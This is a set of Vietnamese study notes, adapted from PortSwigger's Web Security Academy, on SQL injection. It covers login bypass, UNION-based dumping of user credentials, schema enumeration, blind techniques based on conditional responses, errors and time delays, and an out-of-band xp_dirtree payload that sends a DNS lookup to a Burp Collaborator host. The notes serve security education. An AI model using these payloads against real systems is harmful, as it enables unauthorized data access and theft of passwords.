# SQL Injection

Trạng thái: Đang thực hiện
subject: Server-side

[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

# SQLi là gì?

---

SQL injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng gửi đến cơ sở dữ liệu của nó. Điều này có thể cho phép kẻ tấn công xem được dữ liệu mà bình thường họ không thể truy xuất. Dữ liệu này có thể bao gồm dữ liệu thuộc về người dùng khác hoặc bất kỳ dữ liệu nào mà ứng dụng có quyền truy cập. Trong nhiều trường hợp, kẻ tấn công có thể sửa đổi hoặc xóa dữ liệu này, gây ra các thay đổi lâu dài đối với nội dung hoặc hành vi của ứng dụng.

Trong một số tình huống, kẻ tấn công có thể leo thang một cuộc tấn công SQL injection để xâm phạm máy chủ nền hoặc hạ tầng back-end khác. Nó cũng có thể cho phép họ thực hiện các cuộc tấn công từ chối dịch vụ (denial-of-service).

---

# Phát hiện lổ hỗng SQLi

---

Bạn có thể phát hiện SQL injection thủ công bằng cách sử dụng một tập hợp các bài kiểm tra có hệ thống đối với mọi điểm nhập (entry point) trong ứng dụng. Để thực hiện điều này, bạn thường sẽ gửi:

- Ký tự nháy đơn `'` và quan sát lỗi hoặc các hiện tượng bất thường khác.
- Một số cú pháp đặc thù của SQL để đánh giá giá trị gốc (ban đầu) của điểm nhập và so sánh với một giá trị khác, rồi tìm kiếm sự khác biệt có hệ thống trong phản hồi của ứng dụng.
- Các điều kiện Boolean như `OR 1=1` và `OR 1=2`, rồi tìm sự khác biệt trong phản hồi của ứng dụng.
- Các payload được thiết kế để kích hoạt độ trễ thời gian khi được thực thi trong câu truy vấn SQL, và quan sát sự khác biệt về thời gian phản hồi.
- Các payload OAST được thiết kế để kích hoạt một tương tác mạng ngoài băng (out-of-band) khi được thực thi trong câu truy vấn SQL, và giám sát mọi tương tác xảy ra.

Ngoài ra, bạn có thể tìm ra phần lớn các lỗ hổng SQL injection một cách nhanh chóng và đáng tin cậy bằng cách sử dụng **Burp Scanner**.

Hầu hết các lỗ hổng SQL injection xảy ra bên trong mệnh đề `WHERE` của câu truy vấn `SELECT`. Phần lớn những người kiểm thử có kinh nghiệm đều quen thuộc với kiểu SQL injection này.

Tuy nhiên, lỗ hổng SQL injection có thể xuất hiện ở bất kỳ vị trí nào trong câu truy vấn, và trong các loại câu truy vấn khác nhau. Một số vị trí phổ biến khác mà SQL injection có thể xảy ra gồm:

- Trong câu lệnh `UPDATE`, nằm trong các giá trị được cập nhật hoặc trong mệnh đề `WHERE`.
- Trong câu lệnh `INSERT`, nằm trong các giá trị được chèn.
- Trong câu lệnh `SELECT`, nằm trong tên bảng hoặc tên cột.
- Trong câu lệnh `SELECT`, nằm trong mệnh đề `ORDER BY`.

---

# Truy xuất dữ liệu ẩn

---

Hãy tưởng tượng một ứng dụng mua sắm hiển thị các sản phẩm trong các danh mục khác nhau. Khi người dùng nhấp vào danh mục **Gifts**, trình duyệt của họ sẽ gửi yêu cầu đến URL:

```arduino
https://insecure-website.com/products?category=Gifts
```

Điều này khiến ứng dụng tạo một câu truy vấn SQL để lấy thông tin chi tiết của các sản phẩm liên quan từ cơ sở dữ liệu:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Câu truy vấn SQL này yêu cầu cơ sở dữ liệu trả về:

- Tất cả thông tin chi tiết `*`
- Từ bảng `products`
- Nơi mà `category` là **Gifts**
- Và `released` bằng `1`.

Ràng buộc `released = 1` được sử dụng để ẩn các sản phẩm chưa phát hành. Ta có thể giả định rằng đối với các sản phẩm chưa phát hành, `released = 0`.

Ứng dụng này không triển khai bất kỳ biện pháp phòng thủ nào chống lại các cuộc tấn công SQL injection. Điều này có nghĩa là kẻ tấn công có thể tạo ra cuộc tấn công như sau, ví dụ:

```arduino
https://insecure-website.com/products?category=Gifts'--
```

Điều này dẫn đến câu truy vấn SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Điểm quan trọng cần lưu ý là `--` là ký hiệu chú thích (comment) trong SQL. Điều này đồng nghĩa với việc phần còn lại của câu truy vấn sẽ được coi như chú thích và bị bỏ qua. Trong ví dụ này, câu truy vấn sẽ không còn mệnh đề `AND released = 1`. Kết quả là tất cả sản phẩm đều được hiển thị, bao gồm cả những sản phẩm chưa phát hành.

Bạn có thể sử dụng một cuộc tấn công tương tự để khiến ứng dụng hiển thị tất cả sản phẩm trong bất kỳ danh mục nào, kể cả các danh mục mà bạn không biết:

```arduino
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Điều này dẫn đến câu truy vấn SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Câu truy vấn đã bị sửa đổi sẽ trả về tất cả các mục mà **hoặc** danh mục là **Gifts**, **hoặc** `1=1`. Vì `1=1` luôn đúng, câu truy vấn sẽ trả về toàn bộ dữ liệu.

> **Cảnh báo**
Hãy cẩn trọng khi chèn điều kiện `OR 1=1` vào câu truy vấn SQL. Ngay cả khi nó có vẻ vô hại trong ngữ cảnh bạn đang chèn, vẫn rất phổ biến việc ứng dụng sử dụng dữ liệu từ một yêu cầu duy nhất trong nhiều câu truy vấn khác nhau. Nếu điều kiện này lọt vào một câu lệnh `UPDATE` hoặc `DELETE`, ví dụ, nó có thể dẫn đến mất dữ liệu ngoài ý muốn.
> 

---

# Lật ngược logic ứng dụng

---

Hãy tưởng tượng một ứng dụng cho phép người dùng đăng nhập bằng tên đăng nhập (username) và mật khẩu (password). Nếu người dùng gửi username là `wiener` và password là `bluecheese`, ứng dụng kiểm tra thông tin bằng cách thực hiện câu truy vấn SQL sau:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Nếu câu truy vấn trả về thông tin của một người dùng, việc đăng nhập thành công. Ngược lại, sẽ bị từ chối.

Trong trường hợp này, kẻ tấn công có thể đăng nhập dưới tư cách bất kỳ người dùng nào mà không cần mật khẩu. Họ có thể làm điều đó bằng cách dùng chuỗi chú thích SQL `--` để loại bỏ kiểm tra mật khẩu khỏi mệnh đề `WHERE` của câu truy vấn. Ví dụ, gửi username là `administrator'--` và để trống password sẽ tạo ra câu truy vấn sau:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Câu truy vấn này trả về người dùng có `username` là `administrator` và đăng nhập kẻ tấn công thành công với tư cách người đó.

---

# Tấn công UNION

---

Khi một ứng dụng tồn tại lỗ hổng SQL injection và kết quả của câu truy vấn được trả về trong phản hồi của ứng dụng, bạn có thể sử dụng từ khóa `UNION` để truy xuất dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này thường được gọi là **tấn công SQL injection UNION**.

Từ khóa `UNION` cho phép bạn thực hiện một hoặc nhiều câu truy vấn `SELECT` bổ sung và nối kết quả của chúng vào kết quả của câu truy vấn gốc. Ví dụ:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Câu truy vấn SQL này trả về một tập kết quả duy nhất với hai cột, chứa các giá trị từ cột `a` và `b` trong `table1`, và từ cột `c` và `d` trong `table2`.

Để một truy vấn `UNION` hoạt động, cần đáp ứng hai yêu cầu chính:

- Các truy vấn riêng lẻ phải trả về cùng số lượng cột.
- Kiểu dữ liệu trong từng cột phải tương thích giữa các truy vấn riêng lẻ.

Để thực hiện một cuộc tấn công **SQL injection UNION**, bạn cần đảm bảo rằng payload của mình đáp ứng hai yêu cầu này. Điều này thường bao gồm việc xác định:

- Số lượng cột được trả về từ câu truy vấn gốc.
- Cột nào trong kết quả truy vấn gốc có kiểu dữ liệu phù hợp để chứa kết quả từ truy vấn chèn thêm (injected query).

---

## Xác định số lượng collumn

---

Khi thực hiện một cuộc tấn công **SQL injection UNION**, có hai phương pháp hiệu quả để xác định số lượng cột mà câu truy vấn gốc trả về.

Phương pháp đầu tiên là chèn một loạt mệnh đề **`ORDER BY`** và tăng dần chỉ số cột được chỉ định cho đến khi xuất hiện lỗi. Ví dụ, nếu điểm chèn (injection point) nằm trong một chuỗi ký tự được bao trong dấu nháy đơn trong mệnh đề **WHERE** của câu truy vấn gốc, bạn sẽ gửi:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

Chuỗi payload này sẽ chỉnh sửa câu truy vấn gốc để sắp xếp kết quả theo các cột khác nhau trong tập kết quả. Cột trong mệnh đề **`ORDER BY`** có thể được chỉ định bằng chỉ số, vì vậy bạn không cần biết tên của bất kỳ cột nào.

Khi chỉ số cột vượt quá số lượng cột thực tế trong tập kết quả, cơ sở dữ liệu sẽ trả về lỗi, ví dụ:

```sql
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

Ứng dụng có thể trả lại thông báo lỗi của cơ sở dữ liệu trong phản hồi HTTP, nhưng cũng có thể trả về thông báo lỗi chung. Trong một số trường hợp khác, nó có thể chỉ đơn giản trả về kết quả rỗng. Dù là trường hợp nào, miễn là bạn nhận ra sự khác biệt trong phản hồi, bạn có thể suy ra được số lượng cột mà câu truy vấn đang trả về

Phương pháp thứ hai là gửi một loạt payload **`UNION SELECT`** với số lượng giá trị **`NULL`** khác nhau:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```

Nếu số lượng **NULL** không khớp với số lượng cột, cơ sở dữ liệu sẽ trả về lỗi, ví dụ:

```sql
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Chúng ta sử dụng **`NULL`** làm giá trị trả về từ truy vấn **`SELECT`** được chèn vào vì kiểu dữ liệu trong mỗi cột phải tương thích giữa truy vấn gốc và truy vấn chèn. **`NULL`** có thể chuyển đổi sang mọi kiểu dữ liệu phổ biến, vì vậy nó giúp tăng tối đa khả năng payload thành công khi số lượng cột khớp.

Tương tự như kỹ thuật **`ORDER BY`**, ứng dụng có thể trả lại thông báo lỗi của cơ sở dữ liệu trong phản hồi HTTP, hoặc trả về lỗi chung, hoặc đơn giản là không trả về kết quả nào. Khi số lượng **`NULL`** khớp với số lượng cột, cơ sở dữ liệu sẽ trả về một hàng bổ sung trong tập kết quả, chứa giá trị **`NULL`** ở mỗi cột. Tác động lên phản hồi HTTP phụ thuộc vào mã nguồn của ứng dụng:

- Nếu may mắn, bạn sẽ thấy nội dung bổ sung trong phản hồi, chẳng hạn như một dòng mới trong bảng HTML.
- Ngược lại, giá trị **`NULL`** có thể kích hoạt lỗi khác, chẳng hạn như **`NullPointerException`**.
- Trường hợp xấu nhất, phản hồi sẽ trông giống hệt phản hồi khi số lượng **`NULL`** không khớp, khiến phương pháp này trở nên vô hiệu.

Trên **Oracle**, mọi câu truy vấn **`SELECT`** đều phải sử dụng từ khóa **`FROM`** và chỉ định một bảng hợp lệ. Oracle có một bảng tích hợp sẵn tên là **`dual`** có thể dùng cho mục đích này. Vì vậy, các truy vấn chèn (injected queries) trên Oracle sẽ cần có dạng:

```sql
' UNION SELECT NULL FROM DUAL--
```

Các payload được mô tả ở trên sử dụng chuỗi chú thích `--` để bỏ qua phần còn lại của câu truy vấn gốc sau điểm chèn. Trên **MySQL**, chuỗi `--` phải được theo sau bởi một dấu cách. Ngoài ra, có thể dùng ký tự **#** để đánh dấu phần chú thích.

---

## Xác định số lượng collumn bằng dữ liệu

---

Một cuộc tấn công **SQL injection UNION** cho phép bạn lấy kết quả từ một truy vấn được chèn vào. Dữ liệu quan trọng mà bạn muốn lấy thường ở dạng chuỗi. Điều này có nghĩa là bạn cần tìm một hoặc nhiều cột trong kết quả truy vấn gốc có kiểu dữ liệu là chuỗi hoặc tương thích với dữ liệu chuỗi.

Sau khi xác định được số lượng cột cần thiết, bạn có thể kiểm tra từng cột để xem liệu nó có thể chứa dữ liệu chuỗi hay không. Bạn có thể gửi một loạt payload **`UNION SELECT`** đặt giá trị chuỗi vào từng cột lần lượt. Ví dụ, nếu truy vấn trả về bốn cột, bạn sẽ gửi:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Nếu kiểu dữ liệu của cột không tương thích với dữ liệu chuỗi, truy vấn chèn sẽ gây ra lỗi cơ sở dữ liệu, chẳng hạn như:

```sql
Conversion failed when converting the varchar value 'a' to data type int.
```

Nếu không có lỗi và phản hồi của ứng dụng chứa thêm nội dung bao gồm giá trị chuỗi đã chèn, thì cột đó phù hợp để truy xuất dữ liệu dạng chuỗi.

---

## SQL injection UNION để truy xuất Data

---

Khi bạn đã xác định được số lượng cột mà truy vấn gốc trả về và biết được cột nào có thể chứa dữ liệu dạng chuỗi, bạn có thể tiến hành truy xuất dữ liệu quan trọng.

Giả sử rằng:

- Câu truy vấn gốc trả về hai cột, cả hai đều có thể chứa dữ liệu dạng chuỗi.
- Điểm chèn (injection point) nằm trong một chuỗi được bao bởi dấu nháy đơn trong mệnh đề **`WHERE`**.
- Cơ sở dữ liệu có bảng **`users`** với các cột **`username`** và **`password`**.

Trong ví dụ này, bạn có thể truy xuất nội dung bảng **`users`** bằng cách gửi:

```sql
' UNION SELECT username, password FROM users--
```

Để thực hiện được cuộc tấn công này, bạn cần biết rằng có một bảng tên là **`users`** và bảng này có hai cột là **`username`** và **`password`**. Nếu không có thông tin này, bạn sẽ phải đoán tên bảng và cột. Tất cả các hệ quản trị cơ sở dữ liệu hiện đại đều cung cấp cách để kiểm tra cấu trúc cơ sở dữ liệu và xác định bảng cũng như các cột mà chúng chứa.

---

## Truy xuất nhiều giá trị trong một collumn

---

Trong một số trường hợp, câu truy vấn ở ví dụ trước có thể chỉ trả về **một** cột.

Bạn có thể truy xuất nhiều giá trị trong cùng một cột bằng cách **nối** (concatenate) các giá trị lại với nhau. Có thể chèn thêm một ký tự phân tách để dễ dàng nhận biết các giá trị đã được ghép. Ví dụ, trên **Oracle**, bạn có thể gửi:

```sql
' UNION SELECT username || '~' || password FROM users--
```

Ở đây, chuỗi ký hiệu `||` là toán tử nối chuỗi trong Oracle. Truy vấn được chèn này sẽ nối giá trị của các trường **`username`** và **`password`**, được phân tách bởi ký tự `~`.

Kết quả trả về từ truy vấn sẽ chứa toàn bộ danh sách username và password, ví dụ:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

---

# Kiểm tra DB trong các cuộc tấn công SQLi

---

Để khai thác lỗ hổng **SQL injection**, thường cần thu thập thông tin về cơ sở dữ liệu. Thông tin này bao gồm:

- Loại và phiên bản của phần mềm cơ sở dữ liệu.
- Các bảng và cột mà cơ sở dữ liệu đang chứa.

---

## Loại và phiên bản cơ sở dữ liệu

---

Bạn có thể xác định loại và phiên bản của cơ sở dữ liệu bằng cách chèn các truy vấn đặc thù cho từng hệ quản trị cơ sở dữ liệu (DBMS) và kiểm tra xem truy vấn nào hoạt động.

Dưới đây là một số truy vấn dùng để xác định phiên bản cơ sở dữ liệu của các hệ phổ biến:

| Loại CSDL | Truy vấn |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Ví dụ, bạn có thể sử dụng tấn công **UNION** với payload sau:

```sql
' UNION SELECT @@version--
```

Kết quả trả về có thể như sau. Trong trường hợp này, bạn có thể xác nhận rằng cơ sở dữ liệu là **Microsoft SQL Server** và biết được phiên bản đang dùng:

```sql
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

---

## Liệt kê nội dung của cơ sở dữ liệu

---

Hầu hết các loại cơ sở dữ liệu (ngoại trừ **Oracle**) đều có một tập các view gọi là **information schema**. Đây là nơi cung cấp thông tin về cấu trúc cơ sở dữ liệu.

Ví dụ, bạn có thể truy vấn **`information_schema.tables`** để liệt kê các bảng trong cơ sở dữ liệu:

```sql
SELECT * FROM information_schema.tables
```

Kết quả trả về có thể như sau:

```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Kết quả này cho thấy có ba bảng là **`Products`**, **`Users`** và **`Feedback`**.

Tiếp theo, bạn có thể truy vấn **`information_schema.columns`** để liệt kê các cột trong một bảng cụ thể:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Kết quả trả về có thể như sau:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

---

# **Blind SQLi**

---

**SQL injection mù** xảy ra khi một ứng dụng dễ bị tấn công SQL injection, nhưng phản hồi HTTP của nó **không chứa kết quả của truy vấn SQL liên quan** hoặc **chi tiết của bất kỳ lỗi nào từ cơ sở dữ liệu**.

Nhiều kỹ thuật như tấn công `UNION` không hiệu quả đối với các lỗ hổng SQL injection mù. Nguyên nhân là vì chúng dựa vào khả năng nhìn thấy kết quả của truy vấn đã chèn trong phản hồi của ứng dụng.

Vẫn có thể khai thác SQL injection mù để truy cập dữ liệu trái phép, nhưng cần sử dụng các kỹ thuật khác

---

## Phản hồi có điều kiện

---

Hãy xem xét một ứng dụng sử dụng cookie theo dõi để thu thập dữ liệu phân tích về việc sử dụng. Các yêu cầu gửi đến ứng dụng bao gồm một header cookie như sau:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Khi một yêu cầu chứa cookie `TrackingId` được xử lý, ứng dụng sử dụng một truy vấn SQL để xác định xem đây có phải là người dùng đã biết hay không:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Truy vấn này dễ bị tấn công SQL injection, nhưng kết quả từ truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng lại có hành vi khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một `TrackingId` đã được nhận diện, truy vấn sẽ trả về dữ liệu và bạn sẽ nhận được thông báo **"Welcome back"** trong phản hồi.

Hành vi này đủ để có thể khai thác lỗ hổng SQL injection mù. Bạn có thể lấy thông tin bằng cách kích hoạt các phản hồi khác nhau có điều kiện, dựa trên một điều kiện được chèn vào truy vấn.

Để hiểu cách khai thác này hoạt động, giả sử rằng hai yêu cầu lần lượt được gửi đi, chứa giá trị cookie `TrackingId` như sau:

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

Giá trị đầu tiên khiến truy vấn trả về kết quả, vì điều kiện chèn vào `AND '1'='1` là **đúng**. Kết quả là thông báo **"Welcome back"** sẽ được hiển thị.

Giá trị thứ hai khiến truy vấn **không** trả về kết quả, vì điều kiện chèn vào là **sai**. Thông báo **"Welcome back"** sẽ không được hiển thị.

Điều này cho phép chúng ta xác định câu trả lời cho bất kỳ điều kiện nào được chèn vào, và từ đó trích xuất dữ liệu từng phần một.

Ví dụ, giả sử có một bảng tên là `Users` với các cột `Username` và `Password`, và có một người dùng tên **`Administrator`**.

Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một loạt dữ liệu đầu vào để kiểm tra mật khẩu từng ký tự một.

Để thực hiện, bắt đầu với dữ liệu đầu vào sau:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Yêu cầu này trả về thông báo **"Welcome back"**, cho thấy điều kiện chèn vào là **đúng**, và ký tự đầu tiên của mật khẩu **lớn hơn** `m`.

Tiếp theo, gửi dữ liệu đầu vào sau:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Yêu cầu này **không** trả về thông báo **"Welcome back"**, cho thấy điều kiện là **sai**, và ký tự đầu tiên của mật khẩu **không lớn hơn** `t`.

Cuối cùng, gửi dữ liệu đầu vào sau, và yêu cầu này trả về thông báo **"Welcome back"**, xác nhận rằng ký tự đầu tiên của mật khẩu là `s`:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Chúng ta có thể tiếp tục quy trình này để xác định toàn bộ mật khẩu của người dùng **Administrator** một cách có hệ thống.

> **Lưu ý**
Hàm `SUBSTRING` trong một số loại cơ sở dữ liệu có tên là `SUBSTR`.
> 

---

## Lỗi

---

SQL injection dựa trên lỗi đề cập đến các trường hợp bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy luận dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong bối cảnh **blind SQLi**.

Khả năng khai thác phụ thuộc vào cấu hình của cơ sở dữ liệu và loại lỗi mà bạn có thể kích hoạt:

- Bạn có thể khiến ứng dụng trả về phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức boolean. Bạn có thể khai thác điều này theo cách tương tự như kỹ thuật **kích hoạt phản hồi có điều kiện** đã đề cập ở phần trước.
    
    Xem thêm: *Exploiting blind SQL injection by triggering conditional errors*.
    
- Bạn có thể kích hoạt thông báo lỗi hiển thị dữ liệu do truy vấn trả về. Điều này về cơ bản biến một lỗ hổng blind SQL injection thành một lỗ hổng SQL injection hiển thị dữ liệu trực tiếp.
    
    Xem thêm: *Extracting sensitive data via verbose SQL error messages*.
    

---

### Lỗi có điều kiện

---

Một số ứng dụng thực hiện truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật ở phần trước sẽ không hiệu quả, vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt trong phản hồi của ứng dụng.

Trong nhiều trường hợp, bạn có thể khiến ứng dụng trả về phản hồi khác nhau tùy thuộc vào việc lỗi SQL có xảy ra hay không. Bạn có thể sửa đổi truy vấn sao cho nó chỉ gây ra lỗi cơ sở dữ liệu nếu điều kiện là **đúng**. Rất thường xuyên, một lỗi chưa được xử lý do cơ sở dữ liệu ném ra sẽ gây ra sự khác biệt trong phản hồi của ứng dụng, chẳng hạn như hiển thị thông báo lỗi. Điều này cho phép bạn suy luận tính đúng sai của điều kiện được chèn.

Để hiểu cách kỹ thuật này hoạt động, giả sử có hai request được gửi đi, lần lượt chứa các giá trị cookie `TrackingId` như sau:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Các input này sử dụng từ khóa `CASE` để kiểm tra một điều kiện và trả về một biểu thức khác nhau tùy thuộc vào việc điều kiện đó đúng hay sai:

- Với input đầu tiên, biểu thức **`CASE`** được đánh giá thành `'a'`, điều này **không** gây ra bất kỳ lỗi nào.
- Với input thứ hai, biểu thức **`CASE`** được đánh giá thành `1/0`, điều này gây ra lỗi chia cho 0 (*divide-by-zero error*).

Nếu lỗi này khiến phản hồi HTTP của ứng dụng thay đổi, bạn có thể sử dụng nó để xác định xem điều kiện được chèn vào là **đúng** hay **sai**.

Bằng cách sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator'
AND SUBSTRING(Password, 1, 1) > 'm')
THEN 1/0 ELSE 'a' END FROM Users)='a
```

> **Lưu ý**
Có nhiều cách khác nhau để kích hoạt lỗi có điều kiện, và mỗi kỹ thuật sẽ phù hợp nhất với các loại cơ sở dữ liệu khác nhau.
> 

---

### Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi chi tiết từ SQL

---

Việc cấu hình sai cơ sở dữ liệu đôi khi dẫn đến các thông báo lỗi chi tiết (*verbose error messages*). Những thông báo này có thể cung cấp thông tin hữu ích cho kẻ tấn công.

Ví dụ, hãy xem thông báo lỗi sau, xuất hiện sau khi chèn một dấu nháy đơn (**'**) vào tham số `id`:

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Thông báo này cho thấy toàn bộ câu truy vấn mà ứng dụng đã tạo ra bằng dữ liệu nhập của chúng ta.

Trong trường hợp này, ta có thể thấy mình đang chèn payload vào một chuỗi được đặt trong dấu nháy đơn, bên trong câu lệnh **WHERE**.

Điều này giúp việc xây dựng một truy vấn hợp lệ chứa payload độc hại trở nên dễ dàng hơn.

Bằng cách **comment** phần còn lại của câu truy vấn, chúng ta có thể ngăn dấu nháy đơn thừa gây lỗi cú pháp.

**Đôi khi**, bạn có thể khiến ứng dụng tạo ra thông báo lỗi chứa **một phần dữ liệu** được trả về từ truy vấn. Điều này sẽ biến một lỗ hổng **blind SQL injection** thành một lỗ hổng **hiển thị** (visible), giúp việc khai thác dễ dàng hơn.

Bạn có thể sử dụng hàm **`CAST()`** để làm điều này. Hàm này cho phép bạn chuyển đổi dữ liệu từ một kiểu này sang kiểu khác.

Ví dụ, giả sử câu truy vấn chứa đoạn:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Thông thường, dữ liệu bạn muốn đọc là **chuỗi** (*string*). Khi cố gắng chuyển đổi nó sang một kiểu không tương thích, như **`int`**, cơ sở dữ liệu có thể trả về lỗi tương tự như:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Kiểu truy vấn này cũng hữu ích nếu có giới hạn số ký tự khiến bạn không thể sử dụng phương pháp **conditional responses** (phản hồi điều kiện).

---

## Time delay

---

Nếu ứng dụng **bắt và xử lý** các lỗi từ cơ sở dữ liệu một cách trơn tru, thì sẽ **không có sự khác biệt** trong phản hồi của ứng dụng. Điều này đồng nghĩa với việc **kỹ thuật gây lỗi có điều kiện** (conditional errors) ở phần trước sẽ không hoạt động.

Trong trường hợp này, ta vẫn có thể khai thác lỗ hổng **blind SQL injection** bằng cách tạo **độ trễ thời gian** dựa trên việc điều kiện chèn vào là **đúng** hay **sai**.

Vì truy vấn SQL thường được xử lý **đồng bộ** (synchronous) với ứng dụng, nên việc làm chậm quá trình thực thi truy vấn SQL cũng sẽ **làm chậm phản hồi HTTP**. Từ đó, ta có thể **xác định** tính đúng sai của điều kiện dựa trên **thời gian phản hồi** nhận được.

Ví dụ, với **Microsoft SQL Server**, bạn có thể sử dụng câu lệnh sau để kiểm tra một điều kiện và kích hoạt độ trễ nếu điều kiện đó **đúng**:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- Ở câu lệnh đầu tiên, điều kiện `1=2` là **sai** nên **không có** độ trễ.
- Ở câu lệnh thứ hai, điều kiện `1=1` là **đúng** nên sẽ tạo ra **độ trễ 10 giây**.

Bằng kỹ thuật này, ta có thể **trích xuất dữ liệu** bằng cách kiểm tra từng ký tự một, ví dụ:

```sql
'; IF (SELECT COUNT(Username)
       FROM Users
       WHERE Username = 'Administrator'
       AND SUBSTRING(Password, 1, 1) > 'm') = 1
   WAITFOR DELAY '0:0:{delay}'--
```

> **Ghi chú:**
> 
> 
> Có nhiều cách khác nhau để tạo ra độ trễ thời gian trong truy vấn SQL, và mỗi loại cơ sở dữ liệu sẽ có kỹ thuật riêng.
> 

---

## Out-of-band (OAST)

---

Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước, nhưng **thực thi bất đồng bộ**. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong **luồng ban đầu**, đồng thời sử dụng **một luồng khác** để thực thi truy vấn SQL dựa trên cookie `tracking`.

Truy vấn này **vẫn tồn tại lỗ hổng SQL injection**, nhưng **không kỹ thuật nào** ở các phần trước áp dụng được, vì:

- Phản hồi của ứng dụng **không phụ thuộc** vào dữ liệu truy vấn trả về.
- **Không xảy ra lỗi** từ cơ sở dữ liệu.
- **Không phụ thuộc** vào thời gian thực thi truy vấn.

Trong trường hợp này, ta thường có thể khai thác lỗ hổng **blind SQL injection** bằng cách **kích hoạt các tương tác mạng out-of-band** đến một hệ thống do ta kiểm soát. Các tương tác này có thể được **kích hoạt dựa trên điều kiện** được chèn vào truy vấn, giúp **suy luận thông tin từng phần**. Hữu ích hơn, dữ liệu thậm chí có thể được **trích xuất trực tiếp** trong quá trình tương tác mạng này.

Nhiều giao thức mạng có thể dùng cho mục đích này, nhưng **thường hiệu quả nhất là DNS (Domain Name Service)**. Lý do: phần lớn các mạng trong môi trường production cho phép DNS truy vấn ra ngoài (free egress) vì đây là thành phần thiết yếu cho hoạt động bình thường của hệ thống.

**Công cụ đơn giản và đáng tin cậy nhất để sử dụng kỹ thuật out-of-band** là **Burp Collaborator**. Đây là một máy chủ cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm cả **DNS**.

Burp Collaborator cho phép bạn phát hiện khi có **tương tác mạng** xảy ra do gửi các payload riêng lẻ tới ứng dụng có lỗ hổng. **Burp Suite Professional** tích hợp sẵn một client được cấu hình để làm việc với Burp Collaborator **ngay khi cài đặt**.

Các kỹ thuật để kích hoạt một truy vấn DNS phụ thuộc vào **loại cơ sở dữ liệu** đang dùng.

Ví dụ, trên **Microsoft SQL Server**, bạn có thể dùng payload sau để tạo một truy vấn DNS đến tên miền chỉ định:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Lệnh trên khiến cơ sở dữ liệu thực hiện truy vấn DNS tới tên miền:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

